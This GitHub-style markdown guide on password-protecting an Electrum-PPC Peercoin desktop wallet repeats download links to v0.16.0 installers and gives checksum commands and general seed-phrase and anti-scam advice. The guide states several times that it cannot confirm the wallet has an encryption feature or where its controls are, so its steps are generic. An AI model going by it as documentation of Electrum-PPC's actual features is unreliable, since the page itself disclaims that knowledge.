<p align="center"><img src="https://github.com/Peercoin-developments/learn/raw/HEAD/assets/banner-article.png" alt="Electrum-PPC guides" width="100%"></p>

<h1 align="center">Encrypt Your Wallet in Electrum-PPC</h1>

<p align="center">An Electrum-PPC how-to guide for the desktop Peercoin wallet.</p>

<p align="center">
  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-6FD579?style=for-the-badge&logo=windows&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for Windows"></a>
  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-6FD579?style=for-the-badge&logo=apple&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for macOS"></a>
  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-6FD579?style=for-the-badge&logo=linux&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for Linux"></a>
</p>

| Platform | File |
|---|---|
| 🪟 Windows | [`electrum-ppc-wallet-v0.16.0.exe`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe) |
| 🍎 macOS | [`electrum-ppc-wallet-v0.16.0.dmg`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg) |
| 🐧 Linux | [`electrum-ppc-wallet-v0.16.0.zip`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip) |

All versions and checksums are on the [Electrum-PPC v0.16.0 release page](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

**Short answer:** Check whether your Electrum-PPC version offers wallet encryption or password protection, and read what that option protects before enabling it; the guidance below is general, not confirmation of an Electrum-PPC encryption feature, and your recovery seed should be written on paper offline first.

## 🔎 You'll see this if

- You want to protect a wallet on a desktop computer that other people can access.
- You see a password-related prompt but are unsure whether it encrypts stored data or restricts particular actions.
- You already use a password and want to understand what protection it provides.
- You cannot find encryption controls and want to avoid following instructions for a different wallet.

Electrum-PPC is a desktop Peercoin wallet for Windows, macOS and Linux. It is an independent project built on Electrum, without affiliation with or endorsement by the Electrum project. Instructions written for another Electrum-based wallet should not be treated as an exact match.

---

## 🧭 Why it happens

“Password protection” can describe different things. As general security guidance, a password might protect stored wallet material, authorise an operation, or unlock an application. A password prompt alone does not establish which data is encrypted.

For example, a request for a password before an action does not tell you whether transaction history is protected while the application is closed. Likewise, an option labelled with security language should not be interpreted as protection for every backup or exported file.

The confirmed information here does not establish whether Electrum-PPC offers wallet encryption, its scope, or its password behaviour. Check the wording and documentation for the version you actually use. The [Electrum-PPC desktop wallet project](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet) is a starting point for checking project information rather than borrowing another application's instructions.

As general guidance, encryption is one layer of protection, not a substitute for recovery planning or a secure computer. Treat your seed phrase as a separate secret: do not assume a wallet password protects a copy of that phrase.

---

## 🛠️ Fix it step by step

1. **Prepare recovery before changing security settings.**

   Write your seed phrase on paper, offline. Keep it somewhere you control, away from the computer. Do not enter it into a website to “check” the backup, and do not send a photograph to someone offering assistance.

   If you do not have a reliable recovery record, pause before making changes whose consequences you cannot confirm. Review [Electrum-PPC seed phrase safety guidance](https://github.com/Peercoin-developments/learn/blob/main/how-to/seed-phrase-safety-for-electrum-ppc.md) before proceeding.

2. **Make sure you are checking the intended application.**

   Do not install an “encryption patch” supplied through a private message or search advertisement. If you need to check a downloaded installer, the [Electrum-PPC v0.16.0 release and SHA-256 checksums](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0) provide the reference for that release.

   Compare the complete calculated SHA-256 value with the published value for the exact package. Windows uses `Get-FileHash -Algorithm SHA256`; macOS uses `shasum -a 256`; Linux uses `sha256sum`, each with your downloaded file as the input. This is an integrity comparison, not a claim that the packages are signed or notarised.

3. **Look for a documented password or encryption option.**

   General guidance: inspect the application's available settings and accompanying documentation without changing anything yet. Menu names and locations are not confirmed here.

   Write down the option's exact wording, excluding secrets. Distinguish between “set a password,” “change a password,” and an explicit statement about encrypting stored wallet data. If the wording does not explain the scope, do not fill in the gap with assumptions.

4. **Decide whether the stated protection meets your goal.**

   Consider a concrete question: “I want someone who obtains a copy of my stored wallet data to be unable to use its secrets.” That is different from “I want a password prompt before an action.”

   As general guidance, also ask what remains visible and whether backups need separate handling. If documentation does not answer these questions, treat them as unresolved. Do not describe the wallet as fully encrypted just because a password was accepted.

5. **Choose a unique password if a suitable option is confirmed.**

   General password guidance: choose a long, unique password or passphrase rather than reusing an email password. Avoid personal details and predictable variations of an old password.

   Store the password using a method you can reliably access later. Keep the seed phrase on paper offline, separately from routine computer use. Never use the seed itself as the wallet password.

6. **Apply only the change you understand.**

   If your version offers a documented option that matches your goal, follow its instructions. Read any warnings before confirming. Do not simultaneously move wallet data, delete backups, and change passwords; separating changes makes mistakes easier to identify.

   > [!WARNING]
   > Nobody legitimate will ever ask for your seed phrase, private keys, wallet file, remote access, or a payment to “unlock,” “verify,” or “sync” a wallet. Do not share these to obtain encryption help.

7. **Check the result without creating a new risk.**

   General guidance: follow any documented verification procedure. If appropriate under those instructions, close and reopen the application and observe whether its behaviour matches the stated protection. A successful password check confirms only that check, not every possible security property.

   Do not send funds solely to test encryption, deliberately exhaust password attempts, or delete the original wallet as a test. Review [Electrum-PPC backup and restore guidance](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-backup-and-restore.md) before deciding how to handle existing copies.

---

## 🔁 If that did not work

If you cannot find an encryption option, stop rather than applying instructions for another application. Absence of a visible control does not prove either that encryption is unavailable or that it is already enabled.

When requesting clarification, provide your operating system, application version, and non-sensitive wording of the prompt. Avoid screenshots that expose balances, addresses, or personal information when a short transcription would suffice.

If a password is rejected, check basic input issues such as keyboard layout before making further changes. Do not overwrite or delete wallet data in an attempt to reset access. Consult [Electrum-PPC forgotten-password guidance](https://github.com/Peercoin-developments/learn/blob/main/how-to/recover-forgotten-password-electrum-ppc.md) without assuming recovery is guaranteed.

A stale balance is a separate issue: do not restore from seed merely because the display is stale. If you decide to move to a new wallet, create a new wallet and send the funds to it.

---

## 🛡️ Prevention

As general security guidance, keep your computer's login protection and screen locking enabled. Avoid treating an application password as permission to leave the computer unlocked or install untrusted software.

Keep a non-sensitive record of the protection you confirmed and the documentation you followed. Do not include passwords or seed words in that record.

> [!TIP]
> Treat older backups as a separate review task. Do not assume changing protection on the current wallet changes copies made earlier.

---

## ❓ FAQ

<details>
<summary>Does Electrum-PPC definitely support wallet encryption?</summary>

That feature is not confirmed here. Check whether your version offers it and what its documentation says it protects. This article deliberately avoids inventing controls or encryption behaviour.

</details>

<details>
<summary>Is my wallet password the same as my seed phrase?</summary>

Treat them as separate secrets. Write the seed phrase on paper offline, and do not use it as a password. Never provide either secret to someone offering support.

</details>

<details>
<summary>Does a password prompt prove that all wallet data is encrypted?</summary>

No such conclusion should be drawn from a prompt alone. As general guidance, verify the documented scope, including any distinction between protecting stored secrets and authorising actions.

</details>

<details>
<summary>Should I restore my wallet to fix a stale balance?</summary>

Do not restore from seed merely because a display is stale. Keep display troubleshooting separate from recovery and password changes, so you do not introduce unnecessary handling of your recovery secrets.

</details>

---

## ⬇️ Download Electrum-PPC

| Platform | File |
|---|---|
| 🪟 Windows | [`electrum-ppc-wallet-v0.16.0.exe`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe) |
| 🍎 macOS | [`electrum-ppc-wallet-v0.16.0.dmg`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg) |
| 🐧 Linux | [`electrum-ppc-wallet-v0.16.0.zip`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip) |

Checksums for every file are on the [Electrum-PPC v0.16.0 release page](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0).

---

## 🔗 Related articles

| Guide |
|---|
| [Seed Phrase Safety for Electrum-PPC](https://github.com/Peercoin-developments/learn/blob/main/how-to/seed-phrase-safety-for-electrum-ppc.md) |
| [Electrum-PPC Backup and Restore](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-backup-and-restore.md) |
| [Recover a Forgotten Password in Electrum-PPC](https://github.com/Peercoin-developments/learn/blob/main/how-to/recover-forgotten-password-electrum-ppc.md) |
| [Electrum-PPC Security Checklist](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-security-checklist.md) |

[Back to the Electrum-PPC learn hub](https://github.com/Peercoin-developments/learn)
